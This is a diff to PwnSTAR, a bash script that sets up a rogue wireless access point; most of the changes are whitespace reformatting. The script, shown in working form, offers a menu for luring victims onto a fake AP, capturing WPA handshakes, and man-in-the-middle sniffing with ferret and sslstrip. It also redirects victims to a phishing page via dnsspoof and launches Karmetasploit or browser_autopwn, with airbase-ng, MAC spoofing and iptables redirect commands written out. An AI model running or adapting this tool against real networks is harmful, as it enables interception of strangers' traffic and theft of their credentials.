@@ -5,9 +5,9 @@
 # See the README.txt for hints on usage
 
 # --------------------------------------------------------------------------------------------------------------------#
-# v0.91-dev 07/5/2013
+# v0.91 07/8/2013
 #
-# Copyright (C) 2013  Vulpi
+# Copyright (C) 2013  VulpiArgenti
 
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
 # License as published by the Free Software Foundation; either version 2 of the License, or any later version.
@@ -22,12 +22,12 @@
 
 
 #  ===========================================================================================  #
-# 				  "...On The Shoulders Of Giants..."                                            #
+#                                 "...On The Shoulders Of Giants..."                            #
 #  ===========================================================================================  #
 
-# 		Large chunks copied directly from snafu777's quickset script                            #
-#										                                                        #
-#		I couldn't improve on his code, and gave up trying                                      #
+#               Large chunks copied directly from snafu777's quickset script                    #
+#                                                                                               #
+#               I couldn't improve on his code, and gave up trying                              #
 
 #  ===========================================================================================  #
 
@@ -35,12 +35,12 @@
 
 # Indebted to everyone else who has contributed scripts to the wonderful community at BT Forums, especially:
 
-#	    comaX
-#	    ericmilam
-#	    LHYX1
-#	    deathcorps
-#	    g0tmi1k
-#	    killadaninja
+#           comaX
+#           ericmilam
+#           LHYX1
+#           deathcorps
+#           g0tmi1k
+#           killadaninja
 
 # --------------------------------------------------------------------------------------------------------------------#
 
@@ -94,13 +94,11 @@
 
 txtrst="\e[0m"      # Text reset
 
-def="\e[1;34m"	    # default 		   blue
-warn="\e[1;31m"     # warning		   red
-info="\e[1;34m" 	# info             blue
-q="\e[1;32m"		# questions        green
-inp="\e[1;36m"	    # input variables  magenta
-
-### 7 characters = 120 pixels?
+def="\e[1;34m"      # default           blue
+warn="\e[1;31m"     # warning           red
+info="\e[1;34m"     # info              blue
+q="\e[1;32m"        # questions         green
+inp="\e[1;36m"      # input variables   magenta
 
 var=$(ls /etc | grep kde4)          # detect KDE
 if [[ -z $var ]];then
@@ -114,7 +112,7 @@ clear
 
 banner_fn()
 {
-	echo -e "\e[1;37m 
+        echo -e "\e[1;37m 
         ~~~~~~~~~~~~~~~~~~~~~~~VulpiArgenti~~~~~~~~~~~~~~~~~~~~~                                                                 
            _____                   _____ _______       _____  
           |  __ \                 / ____|__   __|/\   |  __ \ 
@@ -130,19 +128,19 @@ sleep 2
 }
 
 first_fn()
-{	
-	# Trap Ctrl-C
-	trap exit_fn INT 
-	# Clear iptables
-	iptables --flush    # delete all rules in default (filter) table
+{       
+    # Trap Ctrl-C
+    trap exit_fn INT 
+    # Clear iptables
+    iptables --flush    # delete all rules in default (filter) table
     iptables -t nat --flush
-	iptables -t mangle --flush
+    iptables -t mangle --flush
     iptables -X         # delete user-defined chains
     iptables -t nat -X
-	iptables -t mangle -X
-	
-	if [[ ! -x /usr/sbin/dhcpd ]];then
-		echo -e "$warn\nNeed to install isc-dhcp-server"
+    iptables -t mangle -X
+    
+    if [[ ! -x /usr/sbin/dhcpd ]];then
+        echo -e "$warn\nNeed to install isc-dhcp-server"
         sleep 1
         echo -e "$q\nDo you want to do it now? (y/n)"
         read var
@@ -151,43 +149,43 @@ first_fn()
         else
             exit_fn
         fi
-	fi
-	
+    fi
+        
     apusage= # set to null
     echo -e "$info\nPress ctrl-C at any time to exit neatly\n"
     sleep 1
-	echo -e "$q\nHow do you want to use the AP?"
+    echo -e "$q\nHow do you want to use the AP?"
     echo -e "$def
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                    Basic Menu
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	
+        
     1) Honeypot: get the victim onto your AP, then use nmap, metasploit etc \n
                  no internet access given
-	
+        
     2) Grab WPA handshake
-	
+        
     3) Sniffing: provide internet access, then be MITM
-	
+        
     4) Simple web server with dnsspoof: redirect the victim to your webpage
-	
+        
     5) Karmetasploit
     
     6) Browser_autopwn
-	 
+         
      
     9) ADVANCED menu
     
-    q) Exit from the script	"
+    q) Exit from the script     "
     
-	read apusage
-	if [[ $apusage = q ]];then
-		exit_fn
+    read apusage
+    if [[ $apusage = q ]];then
+            exit_fn
     elif [[ $apusage != [1-6] && $apusage != 9 ]];then
         first_fn
     elif [[ $apusage = 9 ]];then
         adv_usage_fn
-	fi
+    fi
     setup_fn
 }
 
@@ -195,24 +193,24 @@ setup_fn()
 {
     clear
     echo "1" > /proc/sys/net/ipv4/ip_forward # enable kernel forwarding
-	interface_fn
-	initial_scan_fn
-	ap_presets_fn
+    interface_fn
+    initial_scan_fn
+    ap_presets_fn
     if [[ $apusage = 2 ]];then
-		echo -e  "$warn\nRemember to start the AP with WPA/WPA2 encryption"
-		sleep 2
-	fi
+        echo -e  "$warn\nRemember to start the AP with WPA/WPA2 encryption"
+        sleep 2
+    fi
     ap_setup_fn
     ap_type_fn
     ap_start_fn
     dhcp_presets_fn
-	dhcp_setup_fn
-	dhcp_start_fn
+    dhcp_setup_fn
+    dhcp_start_fn
 
-	case $apusage in 
-	
-		1) 	clear
-			echo -e "$info\nWatch the DHCP tail for visitors, and then play with them!!";;
+    case $apusage in 
+    
+        1)  clear
+            echo -e "$info\nWatch the DHCP tail for visitors, and then play with them!!";;
         
         2)  clear
             echo -e "$info\nMonitor airbase eterm for client associations"
@@ -220,13 +218,13 @@ setup_fn()
             echo -e "$info\nHandshakes will be saved in /root/PwnSTAR-n.cap"
             sleep 2
             echo -e "$info\nConsider de-authing clients";;
-			
-		3)	sniff_fn;;
-			
-		4) 	directory_select_fn
-			apache_fn
+                        
+        3)  sniff_fn;;
+                
+        4)  directory_select_fn
+            apache_fn
             dns_fn
-			tail_txtfile_fn;;
+            tail_txtfile_fn;;
             
         5)  karmalaunch_fn;;
         
@@ -242,8 +240,7 @@ setup_fn()
         
         e)  browser_exploit_fn
         
-	esac
-    
+    esac
     
     sleep 8
     echo
@@ -262,7 +259,7 @@ dev_check_fn() # from "quickset" - checks device exists
     else
         dev_check= # nulled
     fi
-}	
+}       
 
 interface_fn()
 {
@@ -328,7 +325,7 @@ interface_fn()
             interface_fn
         fi
     fi
-	
+        
     while [[ -z $API ]]; do
         echo -e "$def\nAvailable wireless interfaces:"
         ifconfig -a | grep wlan | awk '{ print $1"   "$5 }' # displays available interfaces
@@ -356,14 +353,14 @@ interface_fn()
     dev_check_var=$monap
     dev_check_fn
     if [[ $dev_check == "fail" ]];then
-	    monap= 
-	    interface_fn
+        monap= 
+        interface_fn
     fi
 
     echo -e "$info\nBest to macchange $API and $monap..."
     while [[ -z $rand ]];do
-	    echo -e "$q\nRandom MAC? (y). Or manual (m)"
-	    read rand
+        echo -e "$q\nRandom MAC? (y). Or manual (m)"
+        read rand
     done
     case $rand in
         y|Y) ifconfig $API down && macchanger -A $API && ifconfig $API up
@@ -374,23 +371,23 @@ interface_fn()
              sleep 0.5
              ifconfig $monap down && macchanger -m $ap_mac $monap && ifconfig $monap up;;
     
-	    m|M) while [ -z $ap_mac ];do
-		    echo -e "$q\nDesired MAC Address for $inp $API $q?"
-		    read ap_mac
+        m|M) while [ -z $ap_mac ];do
+                echo -e "$q\nDesired MAC Address for $inp $API $q?"
+                read ap_mac
             done
             if [[ "$ap_mac" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
                 ifconfig $API down && macchanger -m $ap_mac $API && ifconfig $API up
             else
                 echo -e "Invalid MAC address!"
                 ap_mac=
-                rand=		    
+                rand=               
                 sleep 2
                 interface_fn
             fi
             sleep 3 ### not necessary?
             ifconfig $monap down && macchanger -m $ap_mac $monap && ifconfig $monap up;;
-		 
-	    *)  echo -e "$warn\nInvalid. Start again."
+                 
+        *)  echo -e "$warn\nInvalid. Start again."
             rand=
             airmon-ng stop $mon_ap &> /dev/null
             sleep 2
@@ -403,9 +400,9 @@ interface_fn()
 
 initial_scan_fn()
 {
-	echo -e "$warn\nNote: best to start the AP on the same channel as the target $q\n\nDo you want to scan eg to discover target channel, ESSID etc? (y/n) "
-	read initial_scan
-	if [ $initial_scan = "y" ];then
+    echo -e "$warn\nNote: best to start the AP on the same channel as the target $q\n\nDo you want to scan eg to discover target channel, ESSID etc? (y/n) "
+    read initial_scan
+    if [ $initial_scan = "y" ];then
         monscan_start_fn
         
         Eterm -g 100x20-0-0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0 --scrollbar 0 -q -T "Scan" -e airodump-ng "$monscan" 2> /dev/null &
@@ -471,132 +468,132 @@ rescan_fn()
 
 ap_presets_fn()
 {
-	# Set your defaults here
-	ap_ip="192.168.0.1" 		# SoftAP IP Address
-	ap_sm="255.255.255.0" 		# SoftAP Subnet Mask
-	apchan= 					# SoftAP Channel
-	mtu_size=1400 				# MTU Size
-	if [[ $apusage = 2 ]];then	# encryption type
-		encrypt="WPA2"
-        Z="-Z 4 -W 1 -F PwnSTAR" # variable for airbase: "Z 4 -W 1" basically means WPA2, -F saves a cap file
-	else
-		encrypt="open"
-        Z=  		
-	fi
-	echo -e "$info\nInterfaces set up; let's move onto the AP"
-	sleep 1
+    # Set your defaults here
+    ap_ip="192.168.0.1"             # SoftAP IP Address
+    ap_sm="255.255.255.0"           # SoftAP Subnet Mask
+    apchan=                                         # SoftAP Channel
+    mtu_size=1400                           # MTU Size
+    if [[ $apusage = 2 ]];then      # encryption type
+            encrypt="WPA2"
+    Z="-Z 4 -W 1 -F PwnSTAR" # variable for airbase: "Z 4 -W 1" basically means WPA2, -F saves a cap file
+    else
+            encrypt="open"
+    Z=              
+    fi
+    echo -e "$info\nInterfaces set up; let's move onto the AP"
+    sleep 1
     clear
 }
 
 ap_setup_fn()
 {
-	clear
-	echo -e "$def
+    clear
+    echo -e "$def
 
 Set the Soft AP Parameters:
-	
-	1) SoftAP IP Address      \e[1;36m[$ap_ip]
-	$def
-	2) SoftAP Subnet Mask     \e[1;36m[$ap_sm]
-	$def
-	3) SoftAP Channel         \e[1;36m[$apchan]
-	$def
-	  *It is recommended you start the AP on the same channel as the target*
-	
-	4) MTU Size               \e[1;36m[$mtu_size]
-	$def
-	5) Encryption type        \e[1;36m[$encrypt]       $WEPpswd
-	$def
-	
-	C)ontinue\n"
-		read var
-	case $var in
-	
-		1) echo -e "$q\nSoftAP IP Address?"
-		read ap_ip
-		ap_setup_fn;;
-	
-		2) echo -e "$q\nSoftAP Subnet Mask?"
-		read ap_sm
-		ap_setup_fn;;
-	
-		3) echo -e "$q\nSoftAP Channel?"
-		read apchan
-		case $apchan in
-			[1-9]|1[0-4]) ;;
-			*) apchan= ;; 
-		esac
-		ap_setup_fn;;
-	
-		4) echo -e "$q\nDesired MTU Size?"
-		read mtu_size
-		if [[ $mtu_size -lt 42 || $mtu_size -gt 6122 ]];then
-		mtu_size=
-        fi
-		ap_setup_fn;;
-		
-		5) echo -e "$q\nEncryption type?
-			Open
-			WEP40
-			WEP104
-			WPA (for handshake grabbing only)
-			WPA2 (for handshake grabbing only)"
-		read encrypt
-		if [[ $encrypt = "Open" ]];then
-			Z=
-		elif [[ $encrypt = "WEP40" ]];then
-			echo -e "$q\nEnter password (10 character hexadecimal)"
-			read WEPpswd
-			# error check password
-			if [[ $(echo $WEPpswd | wc -m) != 11 ]];then # wc counts the return, therefore 11 not 10
-				echo -e "$warn\nInvalid password"
-				sleep 2
-				WEPpswd=
-				encrypt=
-				ap_setup_fn
-			else
-				Z="-w "$WEPpswd""	# safer to quote the password so there isn't unpredictable expansion ###check this quoting works. brackets instead?
-			fi
-		elif [[ $encrypt = "WEP104" ]];then
-			echo -e "$q\nEnter password (26 character hexadecimal)"
-			read WEPpswd
-			# error check password
-			if [[ $(echo $WEPpswd|wc -m) != 27 ]];then # counts return, therefore 27 not 26
-				echo -e "$warn\nInvalid password"
-				sleep 1
-				WEPpswd=
-				encrypt=
-				ap_setup_fn
-			else
-				Z="-w "$WEPpswd""		# -w sets WEP password
-			fi
-		elif [[ $encrypt = "WPA" ]];then
-			Z="-z 2 -W 1 -F PwnSTAR"    # -W sets WEP flag (see man airbase-ng), z 2 means WPA
-		elif [[ $encrypt = "WPA2" ]];then
-			Z="-Z 4 -W 1 -F PwnSTAR"
-		elif [[ $encrypt = * ]];then
-			echo -e "$warn\nInvalid selection"
-			sleep 1
-            encrypt=
-		fi
-		ap_setup_fn;;
         
-		c|C) if [[ -z $ap_ip || -z $ap_sm || -z $apchan || -z $mtu_size || -z $encrypt ]];then # check all variables are set
-			echo -e "$warn\nNot so fast, all fields must be filled before proceeding"
-			sleep 2
-			ap_setup_fn
-			fi;;
+    1) SoftAP IP Address      \e[1;36m[$ap_ip]
+    $def
+    2) SoftAP Subnet Mask     \e[1;36m[$ap_sm]
+    $def
+    3) SoftAP Channel         \e[1;36m[$apchan]
+    $def
+      *It is recommended you start the AP on the same channel as the target*
+    
+    4) MTU Size               \e[1;36m[$mtu_size]
+    $def
+    5) Encryption type        \e[1;36m[$encrypt]       $WEPpswd
+    $def
+    
+    C)ontinue\n"
+        read var
+        case $var in
+        
+            1) echo -e "$q\nSoftAP IP Address?"
+            read ap_ip
+            ap_setup_fn;;
+    
+            2) echo -e "$q\nSoftAP Subnet Mask?"
+            read ap_sm
+            ap_setup_fn;;
+    
+            3) echo -e "$q\nSoftAP Channel?"
+            read apchan
+            case $apchan in
+                    [1-9]|1[0-4]) ;;
+                    *) apchan= ;; 
+            esac
+            ap_setup_fn;;
+    
+            4) echo -e "$q\nDesired MTU Size?"
+            read mtu_size
+            if [[ $mtu_size -lt 42 || $mtu_size -gt 6122 ]];then
+                mtu_size=
+            fi
+            ap_setup_fn;;
             
-        *) ap_setup_fn;;
-	
-	esac
+            5) echo -e "$q\nEncryption type?
+                    Open
+                    WEP40
+                    WEP104
+                    WPA (for handshake grabbing only)
+                    WPA2 (for handshake grabbing only)"
+            read encrypt
+            if [[ $encrypt = "Open" ]];then
+                Z=
+            elif [[ $encrypt = "WEP40" ]];then
+                echo -e "$q\nEnter password (10 character hexadecimal)"
+                read WEPpswd
+                # error check password
+                if [[ $(echo $WEPpswd | wc -m) != 11 ]];then # wc counts the return, therefore 11 not 10
+                    echo -e "$warn\nInvalid password"
+                    sleep 2
+                    WEPpswd=
+                    encrypt=
+                    ap_setup_fn
+                else
+                    Z="-w "$WEPpswd""       # safer to quote the password so there isn't unpredictable expansion ###check this quoting works. brackets instead?
+                fi
+            elif [[ $encrypt = "WEP104" ]];then
+                echo -e "$q\nEnter password (26 character hexadecimal)"
+                read WEPpswd
+                # error check password
+                if [[ $(echo $WEPpswd|wc -m) != 27 ]];then # counts return, therefore 27 not 26
+                    echo -e "$warn\nInvalid password"
+                    sleep 1
+                    WEPpswd=
+                    encrypt=
+                    ap_setup_fn
+                else
+                    Z="-w "$WEPpswd""               # -w sets WEP password
+                fi
+            elif [[ $encrypt = "WPA" ]];then
+                Z="-z 2 -W 1 -F PwnSTAR"    # -W sets WEP flag (see man airbase-ng), z 2 means WPA
+            elif [[ $encrypt = "WPA2" ]];then
+                Z="-Z 4 -W 1 -F PwnSTAR"
+            elif [[ $encrypt = * ]];then
+                echo -e "$warn\nInvalid selection"
+                sleep 1
+                encrypt=
+            fi
+            ap_setup_fn;;
+    
+            c|C) if [[ -z $ap_ip || -z $ap_sm || -z $apchan || -z $mtu_size || -z $encrypt ]];then # check all variables are set
+                echo -e "$warn\nNot so fast, all fields must be filled before proceeding"
+                sleep 2
+                ap_setup_fn
+                fi;;
+        
+    *) ap_setup_fn;;
+    
+    esac
 }
 
 ap_type_fn()
 {
-	BB= # nulled; if this is repeat run-through, BB would exist, and the while loop would not trigger 
-	while [ -z $BB ];do
-		echo -e "$q 
+    BB= # nulled; if this is repeat run-through, BB would exist, and the while loop would not trigger 
+    while [ -z $BB ];do
+        echo -e "$q 
 
 Choose the \033[4mtype\033[0m\033[1;32m of AP: 
 
@@ -605,60 +602,60 @@ Choose the \033[4mtype\033[0m\033[1;32m of AP:
     2) Bullzeye--> Broadcasts only the specified ESSID
 
     3) Both--> Responds to all, otherwise broadcasts specified\n"
-		
-    read BB
-	done
+                
+        read BB
+    done
 
-	case $BB in
-		[1-3]) ;;
-		*) ap_type_fn;;
-	esac
+    case $BB in
+        [1-3]) ;;
+        *) ap_type_fn;;
+    esac
 }
 
 ap_start_fn()
 {
-	if [[ $internet = y ]];then
-		# forward at0 to the internet
-		iptables -t nat -A POSTROUTING -o $ICI -j MASQUERADE
-	fi
+    if [[ $internet = y ]];then
+            # forward at0 to the internet
+            iptables -t nat -A POSTROUTING -o $ICI -j MASQUERADE
+    fi
 
-	# blackhole targets every probe request
-	if [ $BB == "1" ]; then
-		Eterm -g 80x12-0+0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Blackhole AP" -e airbase-ng $Z -c $apchan -P -C 60 -v $monap 2> /dev/null 2> /dev/null &
-		clear
-		
-	# bullzeye broadcasts specified ESSID only
-	elif [ $BB == "2" ]; then
-		while [ -z $SSID ];do
-			echo -e "$q\nDesired ESSID?"
-			read SSID
-		done
-		Eterm -g 80x12-0+0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Bullzeye AP $SSID" -e airbase-ng $Z -c $apchan -e "$SSID" -v $monap 2> /dev/null &
-		clear
-		
-	# both
-	elif [ $BB == "3" ];then 
-		while  [ -z "$SSID" ];do
-			echo -e "$q\nDesired ESSID eg Free Public WiFi?"
-			read SSID
-		done
-		Eterm -g 80x12-0+0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Both AP $SSID" -e airbase-ng $Z -c $apchan -e "$SSID" -P -C 60 -v $monap 2> /dev/null &
-		clear
-	fi
-	
-	echo -e "$info\nOK, We're finally starting airbase-ng..."
-	sleep 6 # for at0 to be started - crucial
-	modprobe tun 		# probably not necessary
-	ifconfig at0 up $ap_ip netmask $ap_sm
-	ifconfig at0 mtu $mtu_size
+    # blackhole targets every probe request
+    if [ $BB == "1" ]; then
+            Eterm -g 80x12-0+0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Blackhole AP" -e airbase-ng $Z -c $apchan -P -C 60 -v $monap 2> /dev/null 2> /dev/null &
+            clear
+            
+    # bullzeye broadcasts specified ESSID only
+    elif [ $BB == "2" ]; then
+            while [ -z $SSID ];do
+                    echo -e "$q\nDesired ESSID?"
+                    read SSID
+            done
+            Eterm -g 80x12-0+0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Bullzeye AP $SSID" -e airbase-ng $Z -c $apchan -e "$SSID" -v $monap 2> /dev/null &
+            clear
+            
+    # both
+    elif [ $BB == "3" ];then 
+            while  [ -z "$SSID" ];do
+                    echo -e "$q\nDesired ESSID eg Free Public WiFi?"
+                    read SSID
+            done
+            Eterm -g 80x12-0+0 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Both AP $SSID" -e airbase-ng $Z -c $apchan -e "$SSID" -P -C 60 -v $monap 2> /dev/null &
+            clear
+    fi
+    
+    echo -e "$info\nOK, We're finally starting airbase-ng..."
+    sleep 6 # for at0 to be started - crucial
+    modprobe tun            # probably not necessary
+    ifconfig at0 up $ap_ip netmask $ap_sm
+    ifconfig at0 mtu $mtu_size
 }
 
 # ~~~~~~~~~~ DHCP Functions ~~~~~~~~~~ #
 
 dhcp_presets_fn()
 {
-    apnet="192.168.0.0" 		    		# DHCP Subnet 
-    aprange="192.168.0.100 192.168.0.200" 	# DHCP IP range
+    apnet="192.168.0.0"                         # DHCP Subnet 
+    aprange="192.168.0.100 192.168.0.200"       # DHCP IP range
 }
 
 dhcp_setup_fn()
@@ -696,7 +693,7 @@ $def
         dhcp_setup_fn;;
     
         4) echo -e "\033[36m\nIP Range?"
-        read aprange	
+        read aprange    
         dhcp_setup_fn;;
 
         c|C) if [[ -z $ap_ip || -z $ap_sm || -z $apnet || -z $aprange ]];then
@@ -705,51 +702,51 @@ $def
                 dhcp_setup_fn
             fi;;
     
-        *) 	dhcp_setup_fn;;
+        *) dhcp_setup_fn;;
     esac
 }
 
 dhcp_start_fn()
 {
-	echo > /var/lib/dhcp/dhcpd.leases  # Clear any pre-existing dhcp leases
-	cat /dev/null > /tmp/dhcpd.conf
-    
+    echo > /var/lib/dhcp/dhcpd.leases  # Clear any pre-existing dhcp leases
+    cat /dev/null > /tmp/dhcpd.conf
+
     # need a working nameserver from our internet connection
     var=$(grep "nameserver" /etc/resolv.conf | awk '{print $2}' |wc -l) # count the number of nameservers in resolv.conf
     if [[ $var = 1 ]];then  # if 1, use it in dhcpd.conf
         apdns=$(grep nameserver /etc/resolv.conf | awk '{print $2}')
     elif [[ $var > 1 ]];then  # if more than 1 nameserver, manipulate string into an acceptable form for dhcpd.conf
-        apdns=$(grep nameserver /etc/resolv.conf | awk '{print $2}' | tr '\n' ',') # replace newlines with commas
-        apdns=${apdns//,/", "}                           # add a space after all commas
-        apdns=${apdns%", "}                              # delete the final comma/space
-    else apdns="8.8.8.8" # default in case resolv.conf is empty
+        apdns=$(grep nameserver /etc/resolv.conf | awk '{print $2}' | tr '\n' ',')      # replace newlines with commas
+        apdns=${apdns//,/", "}                                                          # add a space after all commas
+        apdns=${apdns%", "}                                                             # delete the final comma/space
+    else apdns="8.8.8.8"        # default in case resolv.conf is empty
     fi
-	
-	echo -e "$info\nGenerating /tmp/dhcpd.conf"
-	echo -e "$info\nStarting DHCP server..."
-	echo "default-lease-time 300;"> /tmp/dhcpd.conf
-	echo "max-lease-time 360;" >> /tmp/dhcpd.conf
-	echo "ddns-update-style none;" >> /tmp/dhcpd.conf
-	echo "authoritative;" >> /tmp/dhcpd.conf
-	echo "log-facility local7;" >> /tmp/dhcpd.conf
-	echo "subnet $apnet netmask $ap_sm {" >> /tmp/dhcpd.conf
-	echo "range $aprange;" >> /tmp/dhcpd.conf
-	echo "option routers $ap_ip;" >> /tmp/dhcpd.conf
+        
+    echo -e "$info\nGenerating /tmp/dhcpd.conf"
+    echo -e "$info\nStarting DHCP server..."
+    echo "default-lease-time 300;"> /tmp/dhcpd.conf
+    echo "max-lease-time 360;" >> /tmp/dhcpd.conf
+    echo "ddns-update-style none;" >> /tmp/dhcpd.conf
+    echo "authoritative;" >> /tmp/dhcpd.conf
+    echo "log-facility local7;" >> /tmp/dhcpd.conf
+    echo "subnet $apnet netmask $ap_sm {" >> /tmp/dhcpd.conf
+    echo "range $aprange;" >> /tmp/dhcpd.conf
+    echo "option routers $ap_ip;" >> /tmp/dhcpd.conf
     echo "option domain-name-servers $apdns;" >> /tmp/dhcpd.conf
-	echo "}"  >> /tmp/dhcpd.conf
+    echo "}"  >> /tmp/dhcpd.conf
 
-	# mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd # not required in Kali/isc-dhcpd
-	dhcpd -cf /tmp/dhcpd.conf & #-pf /var/run/dhcpd/dhcpd.pid at0 &
-	route add -net $apnet netmask $ap_sm gw $ap_ip
-	iptables -P FORWARD ACCEPT  # probably not necessary 'coz we flushed the chains earlier
+    # mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd # not required in Kali/isc-dhcpd
+    dhcpd -cf /tmp/dhcpd.conf & #-pf /var/run/dhcpd/dhcpd.pid at0 &
+    route add -net $apnet netmask $ap_sm gw $ap_ip
+    iptables -P FORWARD ACCEPT  # probably not necessary 'coz we flushed the chains earlier
     if [[ apusage = 4 ]];then
-        iptables -t nat -A PREROUTING -i at0 -j REDIRECT	### ???helps to avoid DNS cache. Still a problem sometimes.
+        iptables -t nat -A PREROUTING -i at0 -j REDIRECT        ### ???helps to avoid DNS cache. Still a problem sometimes.
     fi
-	sleep 1		# for dhcpd to start
-	
-	# tail leases
-	Eterm -g 80x8-0+225 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "DHCP Server Tail" -e tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null &
-    echo -e "$info\n\nSoft AP is now running :-)"	
+    sleep 1         # for dhcpd to start
+    
+    # tail leases
+    Eterm -g 80x8-0+225 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "DHCP Server Tail" -e tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null &
+    echo -e "$info\n\nSoft AP is now running :-)"       
     sleep 2
     clear
 }
@@ -758,24 +755,24 @@ dhcp_start_fn()
 
 sniff_fn()
 {
-	echo -e "$warn\nCheck internet is connected on $ICI"
-	sleep 1
-	# Ferret
-	echo -e "$q\nStart ferret on at0? (y/n)"
-	read ferret
-	if [[ $ferret = y ]];then
+    echo -e "$warn\nCheck internet is connected on $ICI"
+    sleep 1
+    # Ferret
+    echo -e "$q\nStart ferret on at0? (y/n)"
+    read ferret
+    if [[ $ferret = y ]];then
         Eterm -g 80x14-0+373 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Ferret" -e ferret -i at0 --channel $apchan 2> /dev/null & 
         sleep 1
     elif [[ $ferret != n ]];then # any value other than n restarts the function
         echo -e "$warn\nWhat's it gunna be babe...yes or no?"
         sleep 2 
         sniff_fn
-	fi
+    fi
     
-	# SSLStrip           
-	echo -e "$q\nStart sslstrip? (y/n)"
-	read sslstrip
-	if [[ $sslstrip = y ]];then
+    # SSLStrip           
+    echo -e "$q\nStart sslstrip? (y/n)"
+    read sslstrip
+    if [[ $sslstrip = y ]];then
         if [[ $apusage = a || $apusage = b ]];then  # captive portal with some iptables rules already set
             echo "y" > /tmp/sslstrip    # stores $sslstrip
             sleep 0.5
@@ -785,55 +782,55 @@ sniff_fn()
         else                        # standard sslstrip rule
             iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
         fi
-		sslstrip -k -f 2> /dev/null &  
-		sleep 2 # give time for sslstrip to start
-		echo -e "$q\nTail sslstrip.log? (y/n))"
-		read var
-		if [[ $var = y ]];then
-			Eterm -g 80x8-0+770 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Sslstrip Tail" -e tail -f /root/sslstrip.log 2> /dev/null &
-		fi
-	elif [[ $sslstrip != n ]];then # any value other than n restarts the function
+        sslstrip -k -f 2> /dev/null &  
+        sleep 2 # give time for sslstrip to start
+        echo -e "$q\nTail sslstrip.log? (y/n))"
+        read var
+        if [[ $var = y ]];then
+                Eterm -g 80x8-0+770 --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Sslstrip Tail" -e tail -f /root/sslstrip.log 2> /dev/null &
+        fi
+    elif [[ $sslstrip != n ]];then # any value other than n restarts the function
         echo -e "$warn\nWhat's it gunna be babe...yes or no?"
         sleep 2
         sniff_fn
-	fi
-	sleep 2
-	echo -e "$info\nSniffing started"
-	sleep 1
-	if [[ $ferret = y ]]; then
-		echo -e "$info\nFerret will save a pcap dump in /root"
-		sleep 1
-	fi
-	if [[ $sslstrip = y ]];then
-		echo -e "$info\nSslstrip log is in /root"
-		sleep 1
-	fi
-	echo -e "$info\nConsider using yamas or easy-creds to parse logs"
-	sleep 4
+    fi
+    sleep 2
+    echo -e "$info\nSniffing started"
+    sleep 1
+    if [[ $ferret = y ]]; then
+        echo -e "$info\nFerret will save a pcap dump in /root"
+        sleep 1
+    fi
+    if [[ $sslstrip = y ]];then
+        echo -e "$info\nSslstrip log is in /root"
+        sleep 1
+    fi
+    echo -e "$info\nConsider using yamas or easy-creds to parse logs"
+    sleep 4
 }
 
 # ~~~~~~~~~~ Web Server Functions ~~~~~~~~~~ #
 
-directory_select_fn()	
+directory_select_fn()   
 # Must set up directory structure properly!!! See intro notes.
 {
     echo -e "$info\nSetting up the web page"
     sleep 0.5
     echo -e "$warn\nMUST have directory structure set up correctly"
     sleep 1
-	if [[ $apusage == 4 ]];then 
+    if [[ $apusage == 4 ]];then 
         echo -e "$info\nUse hotspot_3, or your own website"
         sleep 0.5
     fi
-	echo -e "$info\nAvailable web directories:\n\n$(ls /var/www)"
+    echo -e "$info\nAvailable web directories:\n\n$(ls /var/www)"
     sleep 0.5
     echo -e "$q\nSelect directory"
     read wwwdir
     if [[ -d /var/www/"$wwwdir" ]];then
-            mkdir /var/www/backups &>/dev/null      # make backup directory NB clear this out occasionally
-            mv /var/www/index.html /var/www//backups/index.html.`date +%Y%m%d%H%M` &>/dev/null  # back-up existing index files
-            mv /var/www/index.php /var/www/backups/index.php.`date +%Y%m%d%H%M` &>/dev/null 
-            cp /var/www/"$wwwdir"/index.* /var/www/ #   copy index from phishing folder to var/www
+        mkdir /var/www/backups &>/dev/null      # make backup directory NB clear this out occasionally
+        mv /var/www/index.html /var/www//backups/index.html.`date +%Y%m%d%H%M` &>/dev/null  # back-up existing index files
+        mv /var/www/index.php /var/www/backups/index.php.`date +%Y%m%d%H%M` &>/dev/null 
+        cp /var/www/"$wwwdir"/index.* /var/www/ #   copy index from phishing folder to var/www
         if [[ $? -ne 0 ]] ;then                     # checks exit code of last command ie did it work?
             echo -e "$warn\nError copying index"
             sleep 2
@@ -844,7 +841,7 @@ directory_select_fn()
         fi
     else echo -e "$warn\nDirectory doesn't exist, eedjit" 
         sleep 2
-        directory_select_fn	
+        directory_select_fn     
     fi
 }
 
